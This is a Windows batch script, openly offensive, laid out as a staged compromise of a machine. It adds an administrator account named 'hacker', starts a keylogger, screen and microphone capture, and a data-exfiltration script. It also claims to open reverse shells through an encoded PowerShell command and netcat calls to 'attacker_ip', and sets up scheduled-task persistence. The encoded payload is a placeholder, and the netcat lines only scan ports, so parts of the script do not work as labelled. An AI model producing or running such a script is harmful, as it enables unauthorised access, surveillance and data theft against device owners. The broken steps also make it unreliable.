@echo off
echo [+] Adding user 'hacker' with password '123456'...
net user hacker 123456 /add
net localgroup administrators hacker /add

echo [+] Starting keylogger...
start /b keylogger.exe

echo [+] Starting screen capture over proxy...
powershell.exe -File screen_capture.ps1

echo [+] Starting microphone recording over proxy...
powershell.exe -File microphone_access.ps1

echo [+] Starting reverse shell via PowerShell...
powershell.exe -EncodedCommand "base64_encoded_shell_script"

echo [+] Starting reverse shell via Netcat...
nc.exe -zv attacker_ip 443
nc.exe -zv attacker_ip 443
nc.exe -zv attacker_ip 443

echo [+] Starting data exfiltration over proxy...
powershell.exe -File data_exfiltration.ps1

echo [+] Creating system-level scheduled task for persistence...
create_task.bat

echo [+] Cleaning up USB and replacing with .png...
clean_usb.bat
